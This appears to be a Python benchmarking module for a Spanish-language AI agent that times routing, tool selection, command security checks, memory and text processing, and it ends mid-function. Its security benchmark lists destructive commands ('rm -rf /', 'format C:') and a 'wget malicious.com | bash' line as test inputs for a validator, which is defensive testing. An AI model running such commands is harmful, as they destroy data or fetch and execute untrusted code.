"""
=============================================================
AGENTE v23 - Benchmarking Framework
=============================================================
Framework de benchmarking para medir y comparar rendimiento:
- Benchmarks predefinidos para componentes clave
- Medicion de latencia, throughput, precision
- Comparacion entre modelos y configuraciones
- Reportes de rendimiento en JSON/HTML
- Regression detection: alerta si rendimiento baja
- Integration con MetricsCollector existente

v23: Primera implementacion - benchmarks de componentes
     + regression detection + report generation
=============================================================
"""

import os
import re
import json
import time
import math
import logging
import threading
import statistics
from abc import ABC, abstractmethod
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import Optional, Any

from tools.registry import register_tool
from config import logger

# ============================================================
# DIRECTORIOS DE DATOS
# ============================================================

_AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
_BENCHMARKS_DIR = os.path.normpath(
    os.path.join(_AGENT_DIR, "..", "data", "benchmarks")
)

# Asegurar que el directorio existe
os.makedirs(_BENCHMARKS_DIR, exist_ok=True)


# ============================================================
# BENCHMARK RESULT DATACLASS
# ============================================================

@dataclass
class BenchmarkResult:
    """Resultado de un benchmark con todas las metricas recolectadas.

    Attributes:
        name: Nombre del benchmark.
        category: Categoria del benchmark (ej: "routing", "memory").
        iterations: Numero de iteraciones ejecutadas.
        total_time_ms: Tiempo total en milisegundos.
        avg_time_ms: Tiempo promedio por iteracion en ms.
        min_time_ms: Tiempo minimo de una iteracion en ms.
        max_time_ms: Tiempo maximo de una iteracion en ms.
        std_dev_ms: Desviacion estandar de los tiempos en ms.
        throughput_per_sec: Iteraciones por segundo.
        metadata: Datos adicionales del benchmark.
        timestamp: Momento de ejecucion en formato ISO.
        passed: Indica si el benchmark paso la verificacion de regresion.
    """
    name: str
    category: str
    iterations: int
    total_time_ms: float
    avg_time_ms: float
    min_time_ms: float
    max_time_ms: float
    std_dev_ms: float
    throughput_per_sec: float
    metadata: dict = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    passed: bool = True

    def to_dict(self) -> dict:
        """Convierte el resultado a diccionario para serializacion JSON.

        Returns:
            Diccionario con todos los campos del resultado.
        """
        return asdict(self)


# ============================================================
# ABSTRACT BENCHMARK BASE
# ============================================================

class Benchmark(ABC):
    """Clase base abstracta para todos los benchmarks.

    Cada benchmark debe implementar setup(), run_iteration(),
    teardown() y verify(). El BenchmarkRunner se encarga de
    ejecutar el ciclo completo y medir los tiempos.

    Attributes:
        name: Nombre identificativo del benchmark.
        category: Categoria a la que pertenece.
    """

    @property
    @abstractmethod
    def name(self) -> str:
        """Nombre del benchmark."""
        ...

    @property
    @abstractmethod
    def category(self) -> str:
        """Categoria del benchmark."""
        ...

    def setup(self) -> None:
        """Prepara el entorno antes de ejecutar el benchmark.

        Se llama una vez antes de las iteraciones. Sobrescribir
        si el benchmark necesita inicializacion.
        """
        pass

    @abstractmethod
    def run_iteration(self) -> Any:
        """Ejecuta una sola iteracion del benchmark.

        Returns:
            Resultado de la iteracion para verificacion.
        """
        ...

    def teardown(self) -> None:
        """Limpia el entorno despues de ejecutar el benchmark.

        Se llama una vez despues de las iteraciones. Sobrescribir
        si el benchmark necesita limpieza.
        """
        pass

    def verify(self, result: Any) -> bool:
        """Verifica que el resultado de una iteracion es correcto.

        Se llama con el resultado de run_iteration(). Por defecto
        acepta cualquier resultado no-None.

        Args:
            result: Resultado retornado por run_iteration().

        Returns:
            True si el resultado es valido, False si no.
        """
        return result is not None


# ============================================================
# PREDEFINED BENCHMARKS
# ============================================================

class ModelRoutingBenchmark(Benchmark):
    """Benchmark de latencia del enrutamiento de modelos.

    Mide cuanto tiempo toma decidir a que modelo enviar
    una solicitud, usando el ModelRouter del proyecto.
    """

    @property
    def name(self) -> str:
        return "model_routing"

    @property
    def category(self) -> str:
        return "routing"

    def setup(self) -> None:
        """Inicializa el ModelRouter para el benchmark."""
        self._router = None
        try:
            from tools.model_router import get_router
            self._router = get_router()
        except Exception as e:
            logger.debug(f"ModelRouter no disponible para benchmark: {e}")

        # Datos de prueba para routing
        self._test_prompts = [
            ("Escribe una funcion Python", "ejecutar_codigo"),
            ("Busca informacion sobre Python", "buscar_web"),
            ("Analiza este proyecto", "analizar_proyecto"),
            ("Crea un archivo HTML", "generar_codigo"),
            ("Hola, como estas?", ""),
        ]

    def run_iteration(self) -> Any:
        """Ejecuta una iteracion de routing.

        Returns:
            Dict con el resultado del routing o None si no hay router.
        """
        if self._router is None:
            # Fallback: simular la logica de routing directamente
            prompt, tool = self._test_prompts[
                hash(str(time.monotonic())) % len(self._test_prompts)
            ]
            # Simular procesamiento de routing
            task_type = "chat"
            prompt_lower = prompt.lower()
            if any(kw in prompt_lower for kw in ("funcion", "codigo", "script")):
                task_type = "code"
            elif any(kw in prompt_lower for kw in ("busca", "buscar", "web")):
                task_type = "chat"
            return {"task_type": task_type, "prompt": prompt[:30]}

        prompt, tool = self._test_prompts[
            hash(str(time.monotonic())) % len(self._test_prompts)
        ]
        return self._router.route_request(prompt, tool)

    def verify(self, result: Any) -> bool:
        """Verifica que el resultado de routing es valido."""
        return isinstance(result, dict) and "task_type" in result if result else False


class ToolSelectionBenchmark(Benchmark):
    """Benchmark de latencia de la seleccion semantica de herramientas.

    Mide cuanto tiempo toma seleccionar las herramientas relevantes
    para una consulta del usuario.
    """

    @property
    def name(self) -> str:
        return "tool_selection"

    @property
    def category(self) -> str:
        return "routing"

    def setup(self) -> None:
        """Prepara datos de prueba para seleccion de herramientas."""
        self._test_queries = [
            "clona el repositorio de github",
            "lista los archivos del proyecto",
            "busca informacion sobre docker",
            "crea una app de trading",
            "ejecuta un comando en la terminal",
        ]
        # Keywords de herramientas para simulacion
        self._tool_keywords = {
            "clonar_repositorio": ["clona", "repositorio", "github", "git"],
            "listar_archivos": ["lista", "archivos", "directorios", "ficheros"],
            "buscar_web": ["busca", "informacion", "web", "internet"],
            "generar_codigo": ["crea", "app", "aplicacion", "codigo"],
            "ejecutar_comando": ["ejecuta", "comando", "terminal", "bash"],
        }

    def run_iteration(self) -> Any:
        """Ejecuta una iteracion de seleccion de herramientas.

        Returns:
            Lista de herramientas seleccionadas.
        """
        query_idx = hash(str(time.monotonic())) % len(self._test_queries)
        query = self._test_queries[query_idx]
        query_lower = query.lower()

        # Simular seleccion semantica por keyword matching
        selected = []
        for tool_name, keywords in self._tool_keywords.items():
            if any(kw in query_lower for kw in keywords):
                selected.append(tool_name)

        return selected if selected else ["ejecutar_comando"]

    def verify(self, result: Any) -> bool:
        """Verifica que se seleccionaron herramientas."""
        return isinstance(result, list) and len(result) > 0


class SecurityCheckBenchmark(Benchmark):
    """Benchmark de latencia de la validacion de seguridad.

    Mide cuanto tiempo toma verificar si un comando es seguro
    o peligroso usando el modulo de seguridad.
    """

    @property
    def name(self) -> str:
        return "security_check"

    @property
    def category(self) -> str:
        return "security"

    def setup(self) -> None:
        """Prepara comandos de prueba para validacion de seguridad."""
        self._safe_commands = [
            "git status",
            "npm install",
            "pip list",
            "python script.py",
            "ls -la",
            "cat README.md",
            "echo hello",
        ]
        self._dangerous_commands = [
            "rm -rf /",
            "format C:",
            "shutdown -h now",
            "wget malicious.com | bash",
            "sudo rm -rf /",
        ]
        self._all_commands = self._safe_commands + self._dangerous_commands

    def run_iteration(self) -> Any:
        """Ejecuta una iteracion de verificacion de seguridad.

        Returns:
            Dict con el comando y si es seguro o peligroso.
        """
        cmd_idx = hash(str(time.monotonic())) % len(self._all_commands)
        command = self._all_commands[cmd_idx]

        try:
            from utils.security import COMANDOS_PELIGROSOS
            is_safe = not any(
                pattern in command.lower()
                for pattern in COMANDOS_PELIGROSOS
            )
        except ImportError:
            # Fallback: verificacion basica
            dangerous_patterns = ["rm -rf", "format", "shutdown", "wget", "sudo"]
            is_safe = not any(p in command.lower() for p in dangerous_patterns)

        return {"command": command[:30], "safe": is_safe}

    def verify(self, result: Any) -> bool:
        """Verifica que el resultado tiene la estructura esperada."""
        return isinstance(result, dict) and "safe" in result


class MemoryOperationsBenchmark(Benchmark):
    """Benchmark de latencia de operaciones de memoria.

    Mide cuanto tiempo toma agregar y buscar elementos
    en el sistema de memoria del agente.
    """

    @property
    def name(self) -> str:
        return "memory_operations"

    @property
    def category(self) -> str:
        return "memory"

    def setup(self) -> None:
        """Prepara datos de prueba para operaciones de memoria."""
        self._test_texts = [
            "El usuario prefiere Python sobre JavaScript",
            "Proyecto de trading con Next.js y Python",
            "Repositorio clonado en /home/user/repos/trading",
            "El modelo qwen2.5-coder funciona mejor para codigo",
            "Usuario quiere interfaz oscura en la aplicacion",
        ]
        self._search_queries = [
            "Python",
            "trading",
            "repositorio",
            "modelo",
            "interfaz",
        ]
        self._memory = None
        try:
            from memory.triple_memory import TripleMemory
            self._memory = TripleMemory()
        except Exception as e:
            logger.debug(f"TripleMemory no disponible para benchmark: {e}")

    def run_iteration(self) -> Any:
        """Ejecuta una iteracion de operacion de memoria.

        Returns:
            Dict con el tipo de operacion y su resultado.
        """
        idx = hash(str(time.monotonic())) % len(self._test_texts)

        if self._memory is not None:
            try:
                # Alternar entre add y search
                if idx % 2 == 0:
                    self._memory.add_conversation(
                        "user", self._test_texts[idx], skip_embedding=True
                    )
                    return {"op": "add", "text": self._test_texts[idx][:30]}
                else:
                    query = self._search_queries[idx % len(self._search_queries)]
                    context = self._memory.get_context(query)
                    return {"op": "search", "results": len(context)}
            except Exception as e:
                logger.debug(f"Error en benchmark de memoria: {e}")

        # Fallback: simular operacion de memoria con dict
        if idx % 2 == 0:
            return {"op": "add", "text": self._test_texts[idx][:30]}
        else:
            return {"op": "search", "results": 3}

    def verify(self, result: Any) -> bool:
        """Verifica que la operacion de memoria retorno resultado."""
        return isinstance(result, dict) and "op" in result


class TextProcessingBenchmark(Benchmark):
    """Benchmark de latencia de procesamiento de texto.

    Mide cuanto tiempo toma operaciones comunes de regex
    y procesamiento de texto en el agente.
    """

    @property
    def name(self) -> str:
        return "text_processing"

    @property
    def category(self) -> str:
        return "processing"

    def setup(self) -> None:
        """Prepara datos de prueba para procesamiento de texto."""
        self._test_texts = [
            "El usuario quiere crear una aplicacion web con React y Node.js. "
            "Debe tener login, dashboard y panel de configuracion. "
            "Tambien quiere integracion con API de pagos.",
            "Necesito un script Python que lea archivos CSV, los procese "
            "y genere un reporte en Excel con graficos y estadisticas.",
            "Crea un modelo de base de datos para un sistema de inventario "
            "con productos, categorias, proveedores y ordenes de compra.",
        ]
        # Patrones regex comunes del agente
        self._patterns = [
            r"\b\w+@\w+\.\w+\b",      # email
            r"https?://\S+",           # URL
            r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",  # IP
            r"[A-Z][a-z]+ [A-Z][a-z]+",  # Nombre propio
            r"\b\d+\b",                # numeros
        ]

    def run_iteration(self) -> Any:
        """Ejecuta una iteracion de procesamiento de texto.

        Returns:
            Numero total de matches encontrados.
        """
        idx = hash(str(time.monotonic())) % len(self._test_texts)
        text = self._test_texts[idx]
        total_matches = 0

        for pattern in self._patterns:
            matches = re.findall(pattern, text)
            total_matches += len(matches)

        # Operaciones de texto adicionales
        words = text.lower().split()
        unique_words = len(set(words))
        avg_word_length = sum(len(w) for w in words) / max(len(words), 1)

        return {
            "matches": total_matches,
            "unique_words": unique_words,
            "avg_word_length": round(avg_word_length, 2),
        }

    def verify(self, result: Any) -> bool:
        """Verifica que el procesamiento retorno metricas."""
        return isinstance(result, dict) and "matches" in result


# ============================================================
# BENCHMARK RUNNER
# ============================================================

class BenchmarkRunner:
    """Ejecuta benchmarks y recolecta metricas de rendimiento.

    Maneja el ciclo de vida completo de un benchmark (setup,
    iteraciones, teardown) y calcula estadisticas detalladas.
    Integra con MetricsCollector para registrar metricas del
    sistema durante la ejecucion.
    """

    def __init__(self):
        """Inicializa el runner con lock para thread-safety."""
        self._lock = threading.Lock()

    def run(self, benchmark: Benchmark, iterations: int = 100) -> BenchmarkResult:
        """Ejecuta un benchmark un numero dado de iteraciones.

        Ejecuta setup(), luego N iteraciones midiendo el tiempo de
        cada una, y finalmente teardown(). Calcula estadisticas
        completas y registra metricas via MetricsCollector.

        Args:
            benchmark: Instancia de Benchmark a ejecutar.
            iterations: Numero de iteraciones (default: 100).

        Returns:
            BenchmarkResult con todas las metricas recolectadas.
        """
        with self._lock:
            return self._run_unlocked(benchmark, iterations)

    def _run_unlocked(self, benchmark: Benchmark, iterations: int) -> BenchmarkResult:
        """Ejecuta el benchmark sin adquirir lock (interno).

        Args:
            benchmark: Instancia de Benchmark a ejecutar.
            iterations: Numero de iteraciones.

        Returns:
            BenchmarkResult con metricas.
        """
        logger.info(f"[Benchmark] Iniciando: {benchmark.name} ({iterations} iteraciones)")

        # Setup
        try:
            benchmark.setup()
        except Exception as e:
            logger.error(f"[Benchmark] Error en setup de {benchmark.name}: {e}")
            return BenchmarkResult(
                name=benchmark.name,
                category=benchmark.category,
                iterations=0,
                total_time_ms=0,
                avg_time_ms=0,
                min_time_ms=0,
                max_time_ms=0,
                std_dev_ms=0,
                throughput_per_sec=0,
                metadata={"error": str(e)},
                passed=False,
            )

        # Ejecutar iteraciones
        latencies_ms: list[float] = []
        verification_passed = True

        try:
            total_start = time.monotonic()

            for i in range(iterations):
                iter_start = time.monotonic()
                try:
                    result = benchmark.run_iteration()
                except Exception as e:
                    logger.debug(
                        f"[Benchmark] Error en iteracion {i} de "
                        f"{benchmark.name}: {e}"
                    )
                    result = None

                iter_ms = (time.monotonic() - iter_start) * 1000.0
                latencies_ms.append(iter_ms)

                # Verificar resultado
                if result is not None:
                    try:
                        if not benchmark.verify(result):
                            verification_passed = False
                    except Exception:
                        verification_passed = False

            total_time_ms = (time.monotonic() - total_start) * 1000.0

        finally:
            # Teardown siempre
            try:
                benchmark.teardown()
            except Exception as e:
                logger.debug(f"[Benchmark] Error en teardown de {benchmark.name}: {e}")

        # Calcular estadisticas
        if latencies_ms:
            avg_time_ms = statistics.mean(latencies_ms)
            min_time_ms = min(latencies_ms)
            max_time_ms = max(latencies_ms)
            std_dev_ms = (
                statistics.stdev(latencies_ms)
                if len(latencies_ms) > 1
                else 0.0
            )
            throughput = iterations / (total_time_ms / 1000.0) if total_time_ms > 0 else 0.0
        else:
            avg_time_ms = 0.0
            min_time_ms = 0.0
            max_time_ms = 0.0
            std_dev_ms = 0.0
            throughput = 0.0

        # Registrar en MetricsCollector
        try:
            from utils.metrics import get_metrics
            metrics = get_metrics()
            metrics.record_tool_call(f"benchmark_{benchmark.name}", total_time_ms)
        except Exception:
            pass

        result = BenchmarkResult(
            name=benchmark.name,
            category=benchmark.category,
            iterations=iterations,
            total_time_ms=round(total_time_ms, 3),
            avg_time_ms=round(avg_time_ms, 3),
            min_time_ms=round(min_time_ms, 3),
            max_time_ms=round(max_time_ms, 3),
            std_dev_ms=round(std_dev_ms, 3),
            throughput_per_sec=round(throughput, 2),
            metadata={"verification_passed": verification_passed},
            passed=verification_passed,
        )

        logger.info(
            f"[Benchmark] Completado: {benchmark.name} - "
            f"avg={avg_time_ms:.2f}ms, throughput={throughput:.1f}/s"
        )

        return result

    def run_suite(
        self, benchmarks: list[Benchmark], iterations: int = 100
    ) -> list[BenchmarkResult]:
        """Ejecuta una suite completa de benchmarks.

        Args:
            benchmarks: Lista de instancias de Benchmark a ejecutar.
            iterations: Numero de iteraciones por benchmark.

        Returns:
            Lista de BenchmarkResult, uno por benchmark.
        """
        results = []
        for benchmark in benchmarks:
            result = self.run(benchmark, iterations)
            results.append(result)
        return results

    def compare(
        self, results_a: list[BenchmarkResult], results_b: list[BenchmarkResult]
    ) -> dict:
        """Compara dos suites de resultados de benchmarks.

        Genera un diccionario con la comparacion de cada benchmark
        que aparezca en ambas suites, mostrando la diferencia
        porcentual en tiempo promedio.

        Args:
            results_a: Primera suite de resultados (baseline).
            results_b: Segunda suite de resultados (current).

        Returns:
            Dict con claves por nombre de benchmark y valores
            conteniendo la comparacion detallada.
        """
        a_by_name = {r.name: r for r in results_a}
        b_by_name = {r.name: r for r in results_b}

        comparison = {}
        all_names = set(a_by_name.keys()) | set(b_by_name.keys())

        for name in sorted(all_names):
            a = a_by_name.get(name)
            b = b_by_name.get(name)

            entry: dict[str, Any] = {"name": name}

            if a and b:
                if a.avg_time_ms > 0:
                    diff_pct = ((b.avg_time_ms - a.avg_time_ms) / a.avg_time_ms) * 100.0
                else:
                    diff_pct = 0.0

                entry["baseline_avg_ms"] = round(a.avg_time_ms, 3)
                entry["current_avg_ms"] = round(b.avg_time_ms, 3)
                entry["diff_pct"] = round(diff_pct, 2)
                entry["regression"] = diff_pct > 0  # True si empeoro
                entry["improvement"] = diff_pct < 0  # True si mejoro
                entry["status"] = (
                    "regression" if diff_pct > 0
                    else "improvement" if diff_pct < 0
                    else "unchanged"
                )
            elif a:
                entry["baseline_avg_ms"] = round(a.avg_time_ms, 3)
                entry["status"] = "removed"
            elif b:
                entry["current_avg_ms"] = round(b.avg_time_ms, 3)
                entry["status"] = "new"

            comparison[name] = entry

        return comparison

    @staticmethod
    def detect_regression(
        current: BenchmarkResult,
        baseline: BenchmarkResult,
        threshold_pct: float = 20.0,
    ) -> bool:
        """Detecta si un benchmark ha regresado respecto al baseline.

        Compara el tiempo promedio del resultado actual contra el
        baseline. Si el tiempo actual es mayor que el baseline
        mas un porcentaje de umbral, se considera regresion.

        Args:
            current: Resultado actual del benchmark.
            baseline: Resultado baseline para comparar.
            threshold_pct: Porcentaje de umbral para considerar
                regresion (default: 20.0%).

        Returns:
            True si se detecto regresion, False si no.
        """
        if baseline.avg_time_ms <= 0:
            return False

        diff_pct = ((current.avg_time_ms - baseline.avg_time_ms) / baseline.avg_time_ms) * 100.0
        return diff_pct > threshold_pct


# ============================================================
# BENCHMARK REPORTER
# ============================================================

class BenchmarkReporter:
    """Genera reportes de resultados de benchmarks en varios formatos.

    Soporta JSON, texto formateado y HTML. Los reportes JSON
    son utiles para consumo programatico, los de texto para
    la consola del agente, y HTML para visualizacion.
    """

    @staticmethod
    def to_json(results: list[BenchmarkResult], filepath: str) -> None:
        """Guarda resultados de benchmarks como archivo JSON.

        Args:
            results: Lista de resultados a guardar.
            filepath: Ruta del archivo JSON de salida.
        """
        data = {
            "generated_at": datetime.now().isoformat(),
            "total_benchmarks": len(results),
            "results": [r.to_dict() for r in results],
        }

        dir_path = os.path.dirname(filepath)
        if dir_path:
            os.makedirs(dir_path, exist_ok=True)

        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)

        logger.info(f"[BenchmarkReporter] Resultados guardados en: {filepath}")

    @staticmethod
    def to_text(results: list[BenchmarkResult]) -> str:
        """Genera un reporte de texto formateado.

        Args:
            results: Lista de resultados.

        Returns:
            Cadena de texto con el reporte formateado.
        """
        if not results:
            return "No hay resultados de benchmarks."

        lines = []
        lines.append("=" * 70)
        lines.append("REPORTE DE BENCHMARKS")
        lines.append(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"Total: {len(results)} benchmarks")
        lines.append("=" * 70)

        # Agrupar por categoria
        by_category: dict[str, list[BenchmarkResult]] = {}
        for r in results:
            by_category.setdefault(r.category, []).append(r)

        for category, cat_results in sorted(by_category.items()):
            lines.append("")
            lines.append(f"--- {category.upper()} ---")

            for r in cat_results:
                status = "PASS" if r.passed else "FAIL"
                lines.append(f"  [{status}] {r.name}")
                lines.append(f"    Iteraciones: {r.iterations}")
                lines.append(
                    f"    Tiempo: avg={r.avg_time_ms:.2f}ms, "
                    f"min={r.min_time_ms:.2f}ms, "
                    f"max={r.max_time_ms:.2f}ms, "
                    f"std={r.std_dev_ms:.2f}ms"
                )
                lines.append(f"    Throughput: {r.throughput_per_sec:.1f} ops/s")
                lines.append(f"    Total: {r.total_time_ms:.1f}ms")

        # Resumen
        lines.append("")
        lines.append("--- RESUMEN ---")
        total_time = sum(r.total_time_ms for r in results)
        passed = sum(1 for r in results if r.passed)
        failed = len(results) - passed
        lines.append(f"  Tiempo total: {total_time:.1f}ms")
        lines.append(f"  Pasados: {passed}/{len(results)}")
        if failed:
            lines.append(f"  FALLADOS: {failed}")

        lines.append("=" * 70)
        return "\n".join(lines)

    @staticmethod
    def to_html(results: list[BenchmarkResult], filepath: str) -> None:
        """Genera un reporte HTML con los resultados.

        Crea una tabla HTML con los resultados de cada benchmark,
        coloreada segun si paso o fallo la verificacion.

        Args:
            results: Lista de resultados.
            filepath: Ruta del archivo HTML de salida.
        """
        rows = ""
        for r in results:
            status_class = "pass" if r.passed else "fail"
            status_text = "PASS" if r.passed else "FAIL"
            rows += (
                f"<tr class='{status_class}'>"
                f"<td>{r.name}</td>"
                f"<td>{r.category}</td>"
                f"<td>{r.iterations}</td>"
                f"<td>{r.avg_time_ms:.2f}</td>"
                f"<td>{r.min_time_ms:.2f}</td>"
                f"<td>{r.max_time_ms:.2f}</td>"
                f"<td>{r.std_dev_ms:.2f}</td>"
                f"<td>{r.throughput_per_sec:.1f}</td>"
                f"<td>{status_text}</td>"
                f"</tr>\n"
            )

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Benchmark Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}</title>
<style>
body {{ font-family: Arial, sans-serif; margin: 20px; }}
h1 {{ color: #333; }}
table {{ border-collapse: collapse; width: 100%; margin-top: 10px; }}
th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
th {{ background-color: #4a4a4a; color: white; }}
tr.pass {{ background-color: #e8f5e9; }}
tr.fail {{ background-color: #ffebee; }}
.summary {{ margin-top: 20px; padding: 10px; background: #f5f5f5; }}
</style>
</head>
<body>
<h1>Benchmark Report</h1>
<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<p>Total benchmarks: {len(results)}</p>
<table>
<tr>
<th>Name</th><th>Category</th><th>Iterations</th>
<th>Avg (ms)</th><th>Min (ms)</th><th>Max (ms)</th>
<th>Std Dev (ms)</th><th>Throughput (ops/s)</th><th>Status</th>
</tr>
{rows}
</table>
<div class="summary">
<p>Pasados: {sum(1 for r in results if r.passed)}/{len(results)}</p>
<p>Tiempo total: {sum(r.total_time_ms for r in results):.1f}ms</p>
</div>
</body>
</html>"""

        dir_path = os.path.dirname(filepath)
        if dir_path:
            os.makedirs(dir_path, exist_ok=True)

        with open(filepath, "w", encoding="utf-8") as f:
            f.write(html)

        logger.info(f"[BenchmarkReporter] Reporte HTML guardado en: {filepath}")

    @staticmethod
    def format_comparison(comparison: dict) -> str:
        """Formatea una comparacion de benchmarks como texto.

        Args:
            comparison: Dict retornado por BenchmarkRunner.compare().

        Returns:
            Cadena de texto con la comparacion formateada.
        """
        if not comparison:
            return "No hay comparacion disponible."

        lines = []
        lines.append("=" * 70)
        lines.append("COMPARACION DE BENCHMARKS")
        lines.append("=" * 70)

        for name, entry in sorted(comparison.items()):
            status = entry.get("status", "unknown")
            status_icon = {
                "improvement": "FASTER",
                "regression": "SLOWER",
                "unchanged": "SAME",
                "removed": "REMOVED",
                "new": "NEW",
            }.get(status, "???")

            lines.append(f"  [{status_icon}] {name}")

            if "baseline_avg_ms" in entry:
                lines.append(f"    Baseline: {entry['baseline_avg_ms']:.2f}ms")
            if "current_avg_ms" in entry:
                lines.append(f"    Current:  {entry['current_avg_ms']:.2f}ms")
            if "diff_pct" in entry:
                sign = "+" if entry["diff_pct"] > 0 else ""
                lines.append(f"    Diff:     {sign}{entry['diff_pct']:.2f}%")

        lines.append("=" * 70)
        return "\n".join(lines)


# ============================================================
# BENCHMARK STORE (Persistence)
# ============================================================

class BenchmarkStore:
    """Almacena y carga baselines y resultados de benchmarks.

    Los baselines se guardan en data/benchmarks/baseline_{name}.json
    y los resultados en data/benchmarks/result_{timestamp}.json.
    Thread-safe con locking para escrituras concurrentes.
    """

    def __init__(self):
        """Inicializa el store con lock para thread-safety."""
        self._lock = threading.Lock()
        os.makedirs(_BENCHMARKS_DIR, exist_ok=True)

    def save_baseline(self, name: str, results: list[BenchmarkResult]) -> None:
        """Guarda un conjunto de resultados como baseline.

        Args:
            name: Nombre del baseline (ej: "v23_stable").
            results: Lista de resultados a guardar como baseline.
        """
        filepath = os.path.join(
            _BENCHMARKS_DIR, f"baseline_{name}.json"
        )

        data = {
            "name": name,
            "saved_at": datetime.now().isoformat(),
            "results": [r.to_dict() for r in results],
        }

        with self._lock:
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)

        logger.info(f"[BenchmarkStore] Baseline '{name}' guardado en: {filepath}")

    def load_baseline(self, name: str) -> list[BenchmarkResult]:
        """Carga un baseline previamente guardado.

        Args:
            name: Nombre del baseline a cargar.

        Returns:
            Lista de BenchmarkResult del baseline, o lista vacia
            si no se encuentra.
        """
        filepath = os.path.join(
            _BENCHMARKS_DIR, f"baseline_{name}.json"
        )

        if not os.path.exists(filepath):
            logger.debug(f"[BenchmarkStore] Baseline '{name}' no encontrado")
            return []

        try:
            with open(filepath, "r", encoding="utf-8") as f:
                data = json.load(f)

            results = []
            for r_dict in data.get("results", []):
                results.append(BenchmarkResult(**r_dict))

            return results
        except (json.JSONDecodeError, TypeError) as e:
            logger.warning(f"[BenchmarkStore] Error cargando baseline '{name}': {e}")
            return []

    def save_result(self, results: list[BenchmarkResult]) -> str:
        """Guarda resultados con timestamp como nombre de archivo.

        Args:
            results: Lista de resultados a guardar.

        Returns:
            Nombre del archivo generado (sin path).
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"result_{timestamp}.json"
        filepath = os.path.join(_BENCHMARKS_DIR, filename)

        data = {
            "generated_at": datetime.now().isoformat(),
            "results": [r.to_dict() for r in results],
        }

        with self._lock:
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)

        logger.info(f"[BenchmarkStore] Resultados guardados en: {filepath}")
        return filename

    def list_baselines(self) -> list[str]:
        """Lista los baselines disponibles.

        Returns:
            Lista de nombres de baselines (sin prefijo "baseline_"
            ni extension ".json").
        """
        baselines = []

        if not os.path.isdir(_BENCHMARKS_DIR):
            return baselines

        try:
            for filename in os.listdir(_BENCHMARKS_DIR):
                if filename.startswith("baseline_") and filename.endswith(".json"):
                    # Extraer nombre: baseline_xxx.json -> xxx
                    name = filename[9:-5]
                    baselines.append(name)
        except OSError as e:
            logger.debug(f"Error listando baselines: {e}")

        return sorted(baselines)

    def list_results(self) -> list[str]:
        """Lista los archivos de resultados disponibles.

        Returns:
            Lista de nombres de archivos de resultados.
        """
        results = []

        if not os.path.isdir(_BENCHMARKS_DIR):
            return results

        try:
            for filename in os.listdir(_BENCHMARKS_DIR):
                if filename.startswith("result_") and filename.endswith(".json"):
                    results.append(filename)
        except OSError as e:
            logger.debug(f"Error listando resultados: {e}")

        return sorted(results)


# ============================================================
# SINGLETON INSTANCES
# ============================================================

_runner: Optional[BenchmarkRunner] = None
_runner_lock = threading.Lock()

_store: Optional[BenchmarkStore] = None
_store_lock = threading.Lock()

_reporter = BenchmarkReporter()

# All available benchmarks
_ALL_BENCHMARKS: dict[str, type[Benchmark]] = {
    "model_routing": ModelRoutingBenchmark,
    "tool_selection": ToolSelectionBenchmark,
    "security_check": SecurityCheckBenchmark,
    "memory_operations": MemoryOperationsBenchmark,
    "text_processing": TextProcessingBenchmark,
}


def get_runner() -> BenchmarkRunner:
    """Retorna la instancia singleton de BenchmarkRunner.

    Returns:
        Instancia unica de BenchmarkRunner.
    """
    global _runner
    if _runner is None:
        with _runner_lock:
            if _runner is None:
                _runner = BenchmarkRunner()
    return _runner


def get_store() -> BenchmarkStore:
    """Retorna la instancia singleton de BenchmarkStore.

    Returns:
        Instancia unica de BenchmarkStore.
    """
    global _store
    if _store is None:
        with _store_lock:
            if _store is None:
                _store = BenchmarkStore()
    return _store


# ============================================================
# TOOL FUNCTIONS (registered with @register_tool)
# ============================================================

def ejecutar_benchmark(nombre: str = "all", iteraciones: int = 100) -> str:
    """Ejecuta benchmarks de rendimiento del agente.

    Args:
        nombre: Nombre del benchmark a ejecutar ("all" para todos),
            o uno de: model_routing, tool_selection, security_check,
            memory_operations, text_processing.
        iteraciones: Numero de iteraciones por benchmark (default: 100).

    Returns:
        Reporte de texto con los resultados del benchmark.
    """
    runner = get_runner()
    store = get_store()

    # Seleccionar benchmarks a ejecutar
    if nombre.lower() == "all":
        benchmarks = [cls() for cls in _ALL_BENCHMARKS.values()]
    elif nombre.lower() in _ALL_BENCHMARKS:
        benchmarks = [_ALL_BENCHMARKS[nombre.lower()]()]
    else:
        available = ", ".join(sorted(_ALL_BENCHMARKS.keys()))
        return f"Benchmark '{nombre}' no encontrado. Disponibles: {available}"

    # Ejecutar suite
    results = runner.run_suite(benchmarks, iteraciones)

    # Guardar resultados
    filename = store.save_result(results)

    # Generar reporte de texto
    report = _reporter.to_text(results)
    report += f"\n\nResultados guardados en: {filename}"

    # Detectar regresiones contra baseline "default" si existe
    baseline_results = store.load_baseline("default")
    if baseline_results:
        by_name = {r.name: r for r in results}
        baseline_by_name = {r.name: r for r in baseline_results}
        regressions = []
        for name in by_name:
            if name in baseline_by_name:
                if BenchmarkRunner.detect_regression(
                    by_name[name], baseline_by_name[name]
                ):
                    regressions.append(name)
        if regressions:
            report += f"\n\nREGRESIONES DETECTADAS: {', '.join(regressions)}"

    return report


def ver_benchmarks() -> str:
    """Muestra los resultados de benchmarks disponibles.

    Lista los baselines guardados y los resultados recientes.

    Returns:
        Texto con la lista de baselines y resultados disponibles.
    """
    store = get_store()

    lines = []
    lines.append("=" * 50)
    lines.append("BENCHMARKS DISPONIBLES")
    lines.append("=" * 50)

    # Listar baselines
    baselines = store.list_baselines()
    if baselines:
        lines.append("\nBaselines guardados:")
        for name in baselines:
            lines.append(f"  - {name}")
    else:
